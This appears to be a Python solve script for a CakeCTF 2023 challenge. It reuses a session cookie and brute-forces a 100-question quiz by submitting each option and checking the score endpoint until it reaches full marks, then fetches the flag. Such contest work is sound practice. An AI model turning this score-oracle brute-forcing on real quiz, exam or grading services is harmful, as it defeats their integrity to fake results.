import requests

URL = 'http://towfl.2023.cakectf.com:8888'
start_url = URL + '/api/start'
submit_url = URL + '/api/submit'
score_url = URL + '/api/score'

COOKIE = None
PAYLOAD = [[0 for _ in range(10)] for _ in range(10)]
SCORE = 0

FLAG = None

def get_session_cookie():
    global COOKIE
    response = requests.post(start_url)

    if response.status_code == 200:
        session_cookie = response.headers.get('Set-Cookie')

        if session_cookie:
            print('Session cookie found in response headers.')
            COOKIE = session_cookie
            return True
        
        else:
            print("Session cookie not found in response headers.")
            return False
    
    else:
        print(f"Error: Unable to retrieve session cookie. Status code {response.status_code}")
        return False

def submit_answers(payload):
    headers = {
        'Content-Type': 'application/json',
        'Cookie': COOKIE
    }
    response = requests.post(submit_url, headers=headers, json=payload)
    return response

def get_current_score():
    headers = {
        'Cookie': COOKIE
    }
    response = requests.get(score_url, headers=headers).json()
    return response['data']['score']

if __name__ == "__main__":
    if get_session_cookie():
        print(f"Session Cookie: {COOKIE}")

        submit_url = URL + '/api/submit'
        score_url = URL + '/api/score'

        for i in range(10):
            for j in range(10):
                temp_payload = [row[:] for row in PAYLOAD]

                for option in range(1, 4):
                    temp_payload[i][j] = option
                    post_response = submit_answers(temp_payload)
                    new_score = get_current_score()
                    if new_score > SCORE:
                        SCORE = new_score
                        PAYLOAD[i][j] = option
                        break

                print(f"Question {i+1} {j+1} Answer {option} Score {SCORE}")

                if SCORE == 100:
                    break
            
            if SCORE == 100:
                break

        print(f"Score: {SCORE}\n")

    FLAG = requests.get(score_url, headers={'Cookie': COOKIE}).json()['data']['flag']
    print(f"Flag: {FLAG}")